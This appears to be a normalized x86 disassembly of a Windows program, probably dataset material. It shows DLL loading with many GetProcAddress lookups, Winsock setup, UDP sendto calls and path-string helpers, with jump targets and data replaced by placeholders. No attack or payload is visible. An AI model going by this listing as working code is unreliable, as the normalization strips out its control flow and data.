retn 0x4
push r--data
call [ GetModuleHandleW@IAT ]
test eax eax
mov [ esi ] eax
jne r-xdata
lea edx [ esp + 0x8 ]
push edx
call sub_42c512
mov [ esp + 0x260 ] 0x0
push r--data
push eax
lea eax [ esp + 0x30 ]
push eax
call sub_401740
add esp 0x10
mov [ esp + 0x25c ] 0x2
lea ecx [ esp + 0x8 ]
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::~basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
lea ecx [ esp + 0x24 ]
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::c_str@IAT ]
push eax
call [ LoadLibraryW@IAT ]
mov [ esi ] eax
mov [ esp + 0x25c ] 0xffffffff
lea ecx [ esp + 0x24 ]
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::~basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
mov edx [ ebp + 0x8 ]
test edx edx
je r-xdata
mov edi [ GetProcAddress@IAT ]
push r--data
push eax
call edi
mov ecx [ esi ]
push r--data
push ecx
mov [ esi + 0x4 ] eax
call edi
mov edx [ esi ]
push r--data
push edx
mov [ esi + 0x8 ] eax
call edi
mov [ esi + 0xc ] eax
mov eax [ esi ]
push r--data
push eax
call edi
mov ecx [ esi ]
push r--data
push ecx
mov [ esi + 0x10 ] eax
call edi
mov edx [ esi ]
push r--data
push edx
mov [ esi + 0x14 ] eax
call edi
mov [ esi + 0x18 ] eax
mov eax [ esi ]
push r--data
push eax
call edi
mov ecx [ esi ]
push r--data
push ecx
mov [ esi + 0x1c ] eax
call edi
mov edx [ esi ]
push r--data
push edx
mov [ esi + 0x20 ] eax
call edi
mov [ esi + 0x24 ] eax
mov eax [ esi ]
push r--data
push eax
call edi
mov ecx [ esi ]
push r--data
push ecx
mov [ esi + 0x28 ] eax
call edi
mov edx [ esi ]
push r--data
push edx
mov [ esi + 0x2c ] eax
call edi
mov [ esi + 0x30 ] eax
mov eax [ esi ]
push r--data
push eax
call edi
mov ecx [ esi ]
push r--data
push ecx
mov [ esi + 0x34 ] eax
call edi
mov edx [ esi ]
push r--data
push edx
mov [ esi + 0x38 ] eax
call edi
mov [ esi + 0x3c ] eax
mov eax [ esi ]
push r--data
push eax
call edi
mov [ esi + 0x40 ] eax
push r--data
mov ecx [ esi ]
push ecx
call edi
mov edx [ esi ]
push r--data
push edx
mov [ esi + 0x48 ] eax
call edi
mov [ esi + 0x4c ] eax
mov eax [ esi ]
push r--data
push eax
call edi
mov ecx [ esi ]
push r--data
push ecx
mov [ esi + 0x50 ] eax
call edi
mov edx [ esi ]
push r--data
push edx
mov [ esi + 0x44 ] eax
call edi
mov [ esi + 0x54 ] eax
mov eax [ esi ]
push r--data
push eax
call edi
mov ecx [ esi ]
push r--data
push ecx
mov [ esi + 0x58 ] eax
call edi
mov edx [ esi ]
push r--data
push edx
mov [ esi + 0x5c ] eax
call edi
mov [ esi + 0x60 ] eax
mov eax [ esi ]
push r--data
push eax
call edi
mov ecx [ esi ]
push r--data
push ecx
mov [ esi + 0x64 ] eax
call edi
mov edx [ esi ]
push r--data
push edx
mov [ esi + 0x68 ] eax
call edi
mov ecx [ esi + 0x4 ]
test ecx ecx
mov [ esi + 0x6c ] eax
je r-xdata
mov [ esp + 0x40 ] ax
mov ecx 0x81
lea edi [ esp + 0x42 ]
[ edi ]
stosw [ edi ]
push 0x104
lea eax [ esp + 0x44 ]
push eax
push edx
mov ecx esi
call sub_42afb0
test eax eax
je r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
mov ecx [ esi + 0x8 ]
test ecx ecx
je r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
lea ecx [ esp + 0x40 ]
push ecx
call [ LoadLibraryW@IAT ]
mov [ esi ] eax
jmp r-xdata
push eax
call [ FreeLibrary@IAT ]
mov [ esi ] 0x0
mov ecx [ esi + 0xc ]
test ecx ecx
je r-xdata
mov ecx [ esi + 0x10 ]
test ecx ecx
je r-xdata
mov ecx [ esi + 0x14 ]
test ecx ecx
je r-xdata
mov ecx [ esi + 0x18 ]
test ecx ecx
je r-xdata
mov ecx [ esi + 0x1c ]
test ecx ecx
je r-xdata
mov ecx [ esi + 0x20 ]
test ecx ecx
je r-xdata
mov ecx [ esi + 0x24 ]
test ecx ecx
je r-xdata
mov ecx [ esi + 0x28 ]
test ecx ecx
je r-xdata
mov ecx [ esi + 0x34 ]
test ecx ecx
je r-xdata
mov ecx [ esi + 0x38 ]
test ecx ecx
je r-xdata
mov ecx [ esi + 0x3c ]
test ecx ecx
je r-xdata
mov ecx [ esi + 0x40 ]
test ecx ecx
je r-xdata
mov ecx [ esi + 0x44 ]
test ecx ecx
je r-xdata
mov ecx [ esi + 0x48 ]
test ecx ecx
je r-xdata
mov ecx [ esi + 0x4c ]
test ecx ecx
je r-xdata
mov ecx [ esi + 0x50 ]
test ecx ecx
je r-xdata
mov ecx [ esi + 0x54 ]
test ecx ecx
je r-xdata
mov ecx [ esi + 0x58 ]
test ecx ecx
je r-xdata
mov ecx [ esi + 0x5c ]
test ecx ecx
je r-xdata
mov ecx [ esi + 0x60 ]
test ecx ecx
je r-xdata
mov ecx [ esi + 0x64 ]
test ecx ecx
je r-xdata
mov ecx [ esi + 0x68 ]
test ecx ecx
je r-xdata
test eax eax
jne r-xdata
sub_42b600
mov eax [ fs : 0x0 ]
mov cl [ rw-data ]
push 0xffffffff
push sub_43357e
push eax
mov eax 0x1
test al cl
mov [ fs : 0x0 ] esp
jne r-xdata
mov ecx [ esp ]
mov eax rw-data
mov [ fs : 0x0 ] ecx
add esp 0xc
retn
or [ rw-data ] eax
mov [ esp + 0x8 ] 0x0
push sub_4341a0
call sub_42e6e6
add esp 0x4
mov [ esp + 0x8 ] 0xffffffff
sub_42b660
mov eax [ fs : 0x0 ]
push 0xffffffff
push sub_43359b
push eax
mov eax [ esp + 0x10 ]
test eax eax
mov [ fs : 0x0 ] esp
push esi
mov esi ecx
mov [ esi ] eax
je r-xdata
mov [ esi + 0x4 ] 0x0
push 0x4
call sub_42e3bc
add esp 0x4
mov [ esp + 0x14 ] eax
mov [ esp + 0xc ] 0x0
test eax eax
je r-xdata
xor eax eax
mov [ eax ] 0x0
jmp r-xdata
mov ecx [ esp + 0x4 ]
mov eax esi
mov [ fs : 0x0 ] ecx
pop esi
add esp 0xc
retn 0x4
push eax
call [ InterlockedIncrement@IAT ]
mov eax esi
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
pop esi
add esp 0xc
retn 0x4
mov [ esp + 0xc ] 0xffffffff
test eax eax
mov [ esi + 0x4 ] eax
je r-xdata
sub_42b6f0
mov eax [ fs : 0x0 ]
push 0xffffffff
push sub_4335bb
push eax
mov eax [ esp + 0x10 ]
test eax eax
mov [ fs : 0x0 ] esp
push esi
mov esi ecx
mov [ esi ] eax
je r-xdata
mov [ esi + 0x4 ] 0x0
push 0x4
call sub_42e3bc
add esp 0x4
mov [ esp + 0x14 ] eax
mov [ esp + 0xc ] 0x0
test eax eax
je r-xdata
xor eax eax
mov [ eax ] 0x0
jmp r-xdata
mov ecx [ esp + 0x4 ]
mov eax esi
mov [ fs : 0x0 ] ecx
pop esi
add esp 0xc
retn 0x4
push eax
call [ InterlockedIncrement@IAT ]
mov eax esi
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
pop esi
add esp 0xc
retn 0x4
mov [ esp + 0xc ] 0xffffffff
test eax eax
mov [ esi + 0x4 ] eax
je r-xdata
sub_42b780
push esi
mov esi ecx
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
pop esi
retn
push eax
call [ InterlockedDecrement@IAT ]
test eax eax
jg r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
push eax
call ??3@YAXPAX@Z
add esp 0x4
mov [ esi ] 0x0
mov [ esi + 0x4 ] 0x0
push eax
call ??3@YAXPAX@Z
add esp 0x4
sub_42b7f0
push esi
mov esi ecx
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
pop esi
retn
push eax
call [ InterlockedDecrement@IAT ]
test eax eax
jg r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
push eax
call ??3@YAXPAX@Z
add esp 0x4
mov [ esi ] 0x0
mov [ esi + 0x4 ] 0x0
push eax
call ??3@YAXPAX@Z
add esp 0x4
sub_42b840
mov eax [ fs : 0x0 ]
mov cl [ rw-data ]
push 0xffffffff
push sub_4335de
push eax
mov eax 0x1
test al cl
mov [ fs : 0x0 ] esp
jne r-xdata
mov ecx [ esp ]
mov eax rw-data
mov [ fs : 0x0 ] ecx
add esp 0xc
retn
or [ rw-data ] eax
xor eax eax
mov [ esp + 0x8 ] eax
mov [ rw-data ] eax
mov eax [ esp + 0x10 ]
push eax
mov ecx rw-data
call sub_42b2a0
push sub_4341b0
call sub_42e6e6
add esp 0x4
mov [ esp + 0x8 ] 0xffffffff
sub_42b8d0
push esi
mov esi [ ecx ]
push 0x0
call sub_42b840
mov ecx [ eax ]
add esp 0x4
test ecx ecx
jne r-xdata
mov ecx [ esp + 0x10 ]
mov edx [ esp + 0xc ]
push ecx
mov ecx [ esp + 0xc ]
push edx
push ecx
push esi
call [ eax + 0xc ]
pop esi
retn 0xc
xor eax eax
pop esi
retn 0xc
sub_42b900
push esi
mov esi [ ecx ]
push 0x0
call sub_42b840
mov ecx [ eax ]
add esp 0x4
test ecx ecx
jne r-xdata
mov ecx [ esp + 0xc ]
mov edx [ esp + 0x8 ]
push ecx
push edx
push esi
call [ eax + 0x14 ]
pop esi
retn 0x8
or eax 0xffffffff
pop esi
retn 0x8
sub_42b930
push esi
mov esi [ ecx ]
push 0x0
call sub_42b840
mov ecx [ eax ]
add esp 0x4
test ecx ecx
jne r-xdata
mov ecx [ esp + 0xc ]
mov edx [ esp + 0x8 ]
push ecx
push edx
push esi
call [ eax + 0x18 ]
pop esi
retn 0x8
or eax 0xffffffff
pop esi
retn 0x8
sub_42b960
sub esp 0x194
mov eax [ rw-data ]
push esi
push 0x0
push 0x1
push 0x1
push 0x0
mov [ esp + 0x1a4 ] eax
mov esi ecx
call [ CreateEventW@IAT ]
test eax eax
mov [ esi ] eax
je r-xdata
xor eax eax
pop esi
mov ecx [ esp + 0x190 ]
call sub_42e72f
add esp 0x194
retn
lea eax [ esp + 0x4 ]
push eax
push 0x202
call [ WSAStartup@IAT ]
test eax eax
je r-xdata
push 0x0
call sub_42b840
mov ecx [ esp + 0x198 ]
add esp 0x4
mov eax 0x1
pop esi
call sub_42e72f
add esp 0x194
retn
mov ecx [ esi ]
push ecx
call [ CloseHandle@IAT ]
mov [ esi ] 0x0
sub_42b9f0
push 0xffffffff
push sub_433614
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x8
push esi
push 0x4
mov esi ecx
mov [ esp + 0x8 ] 0x0
call sub_42e3bc
add esp 0x4
mov [ esp + 0x8 ] eax
mov [ esp + 0x14 ] 0x1
test eax eax
je r-xdata
xor eax eax
mov ecx [ esi ]
mov [ eax ] ecx
jmp r-xdata
mov [ esp + 0x14 ] 0x0
mov esi [ esp + 0x1c ]
push eax
mov ecx esi
call sub_42b6f0
mov ecx [ esp + 0xc ]
mov eax esi
mov [ esp + 0x4 ] 0x1
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x14
retn 0x4
sub_42ba70
push esi
push edi
mov esi ecx
mov edi [ esi ]
push 0x0
call sub_42b840
mov ecx [ eax ]
add esp 0x4
test ecx ecx
je r-xdata
test [ esp + 0xc ] 0x1
je r-xdata
push edi
call [ eax + 0x1c ]
pop edi
mov eax esi
pop esi
retn 0x4
push esi
call ??3@YAXPAX@Z
add esp 0x4
sub_42bab0
push esi
mov esi ecx
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
pop esi
retn
push eax
call [ InterlockedDecrement@IAT ]
test eax eax
jg r-xdata
push edi
mov edi [ esi ]
test edi edi
je r-xdata
mov eax [ esi + 0x4 ]
test eax eax
pop edi
je r-xdata
push ebx
mov ebx [ edi ]
push 0x0
call sub_42b840
mov ecx [ eax ]
add esp 0x4
test ecx ecx
je r-xdata
mov [ esi ] 0x0
mov [ esi + 0x4 ] 0x0
push eax
call ??3@YAXPAX@Z
add esp 0x4
push edi
call ??3@YAXPAX@Z
add esp 0x4
pop ebx
push ebx
call [ eax + 0x1c ]
sub_42bb20
push 0xffffffff
push sub_433644
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push esi
mov [ esp + 0x4 ] 0x0
mov esi [ ecx ]
push 0x0
call sub_42b840
mov ecx [ eax ]
add esp 0x4
test ecx ecx
je r-xdata
mov eax [ esp + 0x18 ]
mov [ eax ] 0x0
mov [ eax + 0x4 ] 0x0
jmp r-xdata
mov ecx [ esp + 0x1c ]
push ecx
push esi
call [ eax + 0x4 ]
mov esi eax
test esi esi
jne r-xdata
mov ecx [ esp + 0x8 ]
mov [ esp + 0x4 ] 0x1
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn 0x8
push 0x4
call sub_42e3bc
add esp 0x4
mov [ esp + 0x1c ] eax
mov [ esp + 0x10 ] 0x2
test eax eax
je r-xdata
xor eax eax
mov [ eax ] esi
jmp r-xdata
mov [ esp + 0x10 ] 0x0
mov esi [ esp + 0x18 ]
push eax
mov ecx esi
call sub_42b660
mov eax esi
sub_42bbc0
mov eax [ fs : 0x0 ]
push 0xffffffff
push sub_4336a2
push eax
mov [ fs : 0x0 ] esp
sub esp 0x1b8
push ebx
mov ebx [ esp + 0x1cc ]
test ebx ebx
push ebp
mov ebp ecx
jne r-xdata
push esi
push edi
call sub_41c7c0
mov edi eax
push ebx
lea ecx [ esp + 0x18 ]
mov [ esp + 0x14 ] edi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov [ esp + 0x1d0 ] 0x0
lea eax [ esp + 0x14 ]
push eax
mov ecx edi
call sub_41b3f0
mov esi eax
mov [ esp + 0x1d0 ] 0xffffffff
lea ecx [ esp + 0x14 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
test esi esi
jbe r-xdata
mov eax 0x1
jmp r-xdata
xor eax eax
lea edx [ esp + 0xc8 ]
mov [ esp + 0x4c ] 0x0
mov ecx 0x1d
lea edi [ esp + 0x50 ]
[ edi ]
mov [ esp + 0xc4 ] edx
call [ rw-data ]
push eax
push ebx
lea ecx [ esp + 0xcc ]
call sub_401de0
mov [ esp + 0x1d0 ] 0x3
mov edi [ ebp ]
mov esi [ esp + 0xc4 ]
xor ebp ebp
push ebp
call sub_42b840
mov ecx [ eax ]
add esp 0x4
cmp ecx ebp
jne r-xdata
push ebx
lea ecx [ esp + 0x18 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov ebx 0x1
mov [ esp + 0x1d0 ] ebx
push 0x0
lea ecx [ esp + 0x18 ]
push ecx
lea edx [ esp + 0x38 ]
push edx
mov ecx edi
call sub_41b310
mov [ esp + 0x1d0 ] 0x2
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
call [ inet_addr@IAT ]
mov ecx [ esp + 0x1dc ]
mov [ ecx + 0x4 ] eax
mov [ esp + 0x1d0 ] bl
lea ecx [ esp + 0x30 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov [ esp + 0x1d0 ] 0xffffffff
lea ecx [ esp + 0x14 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
xor eax eax
jmp r-xdata
mov ecx [ esp + 0x1c0 ]
pop ebp
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x1c4
retn 0x8
push 0x1e
lea ecx [ esp + 0x50 ]
push ecx
push edi
push esi
call [ eax + 0x28 ]
mov edi eax
xor edi edi
jmp r-xdata
pop edi
pop esi
cmp edi ebp
jle r-xdata
push eax
call [ free@IAT ]
add esp 0x4
mov [ esp + 0x1d0 ] 0xffffffff
mov eax [ esp + 0xc4 ]
lea edx [ esp + 0xc8 ]
cmp eax edx
je r-xdata
mov eax 0x1
mov [ esp + 0x18 ] ebp
mov [ esp + 0x1c ] ebp
mov [ esp + 0x20 ] ebp
mov [ esp + 0x1d0 ] 0x4
mov ebp [ inet_ntoa@IAT ]
xor esi esi
push ebx
lea ecx [ esp + 0x34 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov [ esp + 0x1d0 ] 0x6
lea ecx [ esp + 0x14 ]
push ecx
mov ecx [ esp + 0x14 ]
lea edx [ esp + 0x34 ]
push edx
call sub_41c4d0
mov [ esp + 0x1d0 ] 0x4
lea ecx [ esp + 0x30 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov ecx [ esp + 0x4c ]
mov eax [ esp + 0x1dc ]
mov [ eax + 0x4 ] ecx
mov [ esp + 0x1d0 ] 0xffffffff
lea ecx [ esp + 0x14 ]
call sub_41b5e0
xor eax eax
jmp r-xdata
mov eax [ esp + esi * 4 + 0x4c ]
push eax
call ebp
push eax
lea ecx [ esp + 0x34 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov [ esp + 0x1d0 ] 0x5
lea eax [ esp + 0x30 ]
push eax
lea ecx [ esp + 0x18 ]
call sub_41f5a0
mov [ esp + 0x1d0 ] 0x4
lea ecx [ esp + 0x30 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
dec edi
inc esi
test edi edi
jg r-xdata
cmp esi 0x1e
jae r-xdata
sub_42be40
push 0xffffffff
push sub_4336c6
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x98
mov eax [ rw-data ]
push esi
push edi
push 0x0
push 0x2
push 0x2
mov [ esp + 0xa8 ] eax
call [ socket@IAT ]
mov ecx [ esp + 0xc0 ]
mov edi eax
xor eax eax
mov [ esp + 0x8c ] eax
mov [ esp + 0x90 ] eax
mov [ esp + 0x94 ] eax
push ecx
mov [ esp + 0x9c ] eax
mov [ esp + 0x90 ] 0x2
call [ htons@IAT ]
lea edx [ esp + 0xc ]
mov [ esp + 0x8e ] ax
mov [ esp + 0x8 ] edx
call [ rw-data ]
mov esi [ esp + 0xbc ]
push eax
push esi
lea ecx [ esp + 0x10 ]
call sub_401e50
mov [ esp + 0xa8 ] 0x0
mov eax [ esp + 0x8 ]
push eax
call [ inet_addr@IAT ]
mov [ esp + 0x90 ] eax
mov [ esp + 0xa8 ] 0xffffffff
mov eax [ esp + 0x8 ]
lea ecx [ esp + 0xc ]
cmp eax ecx
je r-xdata
cmp [ esp + 0x90 ] 0xffffffff
jne r-xdata
push eax
call [ free@IAT ]
add esp 0x4
mov ecx [ esp + 0xb4 ]
mov edx [ esp + 0xb0 ]
push 0x10
lea eax [ esp + 0x90 ]
push eax
push 0x0
push ecx
push edx
push edi
call [ sendto@IAT ]
push edi
mov esi eax
call [ closesocket@IAT ]
mov eax esi
lea edx [ esp + 0xc ]
push ebx
mov [ esp + 0xc ] edx
call [ rw-data ]
push eax
push esi
lea ecx [ esp + 0x14 ]
call sub_401e50
mov [ esp + 0xac ] 0x1
mov ecx [ esp + 0xc ]
lea eax [ esp + 0x90 ]
push eax
push ecx
call sub_42b600
mov ecx eax
call sub_42bbc0
test eax eax
setne bl
mov [ esp + 0xac ] 0xffffffff
mov eax [ esp + 0xc ]
lea edx [ esp + 0x10 ]
cmp eax edx
je r-xdata
test bl bl
pop ebx
je r-xdata
push eax
call [ free@IAT ]
add esp 0x4
or eax 0xffffffff
jmp r-xdata
mov ecx [ esp + 0xa0 ]
pop edi
mov [ fs : 0x0 ] ecx
mov ecx [ esp + 0x98 ]
pop esi
call sub_42e72f
add esp 0xa4
retn 0x14
sub_42c044
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
push edi
mov edi [ ebp + 0xc ]
test edi edi
je r-xdata
mov ecx [ ebp + 0x8 ]
push r--data
cmp [ edi ] 0x0
je r-xdata
push ebx
push esi
mov esi [ wcsrchr@IAT ]
push 0x5c
push edi
call esi
push 0x2f
push edi
mov ebx eax
call esi
add esp 0x10
cmp ebx eax
jbe r-xdata
test eax eax
mov ecx [ ebp + 0x8 ]
pop esi
pop ebx
jne r-xdata
mov eax ebx
add eax 0x2
push eax
jmp r-xdata
push edi
jmp r-xdata
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
mov eax [ ebp + 0x8 ]
pop edi
leave
retn
sub_42c09d
mov eax sub_4336f3
call sub_42ed78
sub esp 0x28
mov eax [ rw-data ]
and [ ebp - 0x30 ] 0x0
xor eax ebp
push esi
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0xc ]
push edi
mov edi [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x2c ]
push eax
mov [ ebp - 0x34 ] edi
call sub_42c044
pop ecx
pop ecx
mov eax [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::npos@IAT ]
push [ eax ]
xor esi esi
inc esi
push 0x2e
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x4 ] esi
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::rfind@IAT ]
mov ecx [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::npos@IAT ]
cmp eax [ ecx ]
jne r-xdata
push eax
push 0x0
push edi
lea ecx [ ebp - 0x2c ]
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::substr@IAT ]
lea eax [ ebp - 0x2c ]
push eax
mov ecx edi
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
jmp r-xdata
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x4 ] 0x0
mov [ ebp - 0x30 ] esi
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::~basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
mov ecx [ ebp - 0x10 ]
mov eax edi
pop edi
xor ecx ebp
pop esi
call sub_42e72f
leave
retn
sub_42c136
mov eax sub_433720
call sub_42ed78
sub esp 0x28
mov eax [ rw-data ]
and [ ebp - 0x30 ] 0x0
xor eax ebp
push esi
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0xc ]
push edi
mov edi [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x2c ]
push eax
mov [ ebp - 0x34 ] edi
call sub_42c044
pop ecx
pop ecx
mov eax [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::npos@IAT ]
push [ eax ]
xor esi esi
inc esi
push 0x2e
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x4 ] esi
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::rfind@IAT ]
mov ecx [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::npos@IAT ]
mov ecx [ ecx ]
cmp eax ecx
jne r-xdata
push ecx
inc eax
push eax
push edi
lea ecx [ ebp - 0x2c ]
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::substr@IAT ]
push r--data
mov ecx edi
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
jmp r-xdata
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x4 ] 0x0
mov [ ebp - 0x30 ] esi
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::~basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
mov ecx [ ebp - 0x10 ]
mov eax edi
pop edi
xor ecx ebp
pop esi
call sub_42e72f
leave
retn
sub_42c1d2
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
push edi
mov edi [ ebp + 0xc ]
test edi edi
je r-xdata
push r--data
cmp [ edi ] 0x0
je r-xdata
push ebx
push esi
mov esi [ wcsrchr@IAT ]
push 0x5c
push edi
call esi
push 0x2f
push edi
mov ebx eax
call esi
add esp 0x10
cmp ebx eax
jbe r-xdata
test eax eax
pop esi
pop ebx
jne r-xdata
mov eax ebx
mov ecx [ ebp + 0x8 ]
sub eax edi
sar eax 0x1
inc eax
push eax
push edi
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
jmp r-xdata
push 0x132b3a1
call sub_42c79b
mov [ esp ] r--data
jmp r-xdata
mov eax [ ebp + 0x8 ]
pop edi
leave
retn
mov ecx [ ebp + 0x8 ]
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
sub_42c244
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
push ebx
mov ebx [ ebp + 0xc ]
test ebx ebx
je r-xdata
push r--data
cmp [ ebx ] 0x0
je r-xdata
push esi
mov esi [ wcschr@IAT ]
push edi
push 0x5c
push ebx
call esi
push 0x2f
push ebx
mov edi eax
call esi
add esp 0x10
test edi edi
je r-xdata
test eax eax
pop edi
pop esi
jne r-xdata
test eax eax
je r-xdata
mov ecx [ ebp + 0x8 ]
sub eax ebx
sar eax 0x1
inc eax
push eax
push ebx
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
jmp r-xdata
push 0x132b3a1
call sub_42c79b
mov [ esp ] r--data
jmp r-xdata
mov eax edi
cmp edi eax
jae r-xdata
mov eax [ ebp + 0x8 ]
pop ebx
leave
retn
mov ecx [ ebp + 0x8 ]
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
sub_42c2be
mov eax sub_43374d
call sub_42ed78
sub esp 0x28
mov eax [ rw-data ]
and [ ebp - 0x30 ] 0x0
xor eax ebp
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0xc ]
test eax eax
push ebx
mov ebx [ ebp + 0x8 ]
push edi
mov [ ebp - 0x34 ] ebx
je r-xdata
push r--data
mov ecx ebx
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
cmp [ eax ] 0x0
je r-xdata
push eax
lea ecx [ ebp - 0x2c ]
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
mov eax [ ebp - 0x28 ]
xor edi edi
inc edi
cmp [ ebp - 0x14 ] 0x8
mov [ ebp - 0x4 ] edi
jae r-xdata
mov ecx [ ebp - 0x18 ]
mov ax [ eax + ecx * 2 - 0x2 ]
cmp ax 0x5c
je r-xdata
lea eax [ ebp - 0x28 ]
dec ecx
push ecx
lea ecx [ ebp - 0x2c ]
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::resize@IAT ]
cmp ax 0x2f
jne r-xdata
cmp ecx eax
pop esi
jne r-xdata
cmp eax ecx
je r-xdata
mov eax [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::npos@IAT ]
push esi
push [ eax ]
lea ecx [ ebp - 0x2c ]
push 0x5c
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::rfind@IAT ]
mov esi eax
mov eax [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::npos@IAT ]
push [ eax ]
lea ecx [ ebp - 0x2c ]
push 0x2f
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::rfind@IAT ]
mov ecx [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::npos@IAT ]
mov ecx [ ecx ]
cmp esi ecx
je r-xdata
inc eax
